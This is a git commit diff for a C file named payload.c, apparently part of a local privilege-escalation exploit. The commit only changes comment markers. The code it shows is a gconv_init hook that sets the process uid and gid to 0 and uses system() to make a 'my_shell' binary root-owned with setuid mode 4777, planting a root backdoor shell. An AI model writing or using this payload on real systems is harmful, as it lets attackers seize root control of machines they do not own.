af5f54f233553f36acdbfa96f3a06a6f91bf76c5
LDRMoliner <molinamikel0404@gmail.com>
2025-04-18 14:40:00 +0200

    Changed incorrect token for comments in C

--- payload.c
+++ payload.c
@@ -4,12 +4,12 @@
 
 int gconv_init() {
 
-    # We set the id and group of the process to root.
+    // We set the id and group of the process to root.
 
     setuid(0);
     setgid(0);
     
-    # We make the utility as if it were from root, we also set the bit setuid as root. 
+    // We make the utility as if it were from root, we also set the bit setuid as root. 
     system("/usr/bin/chown root my_shell");
     system("/usr/bin/chmod 4777 my_shell");
 }
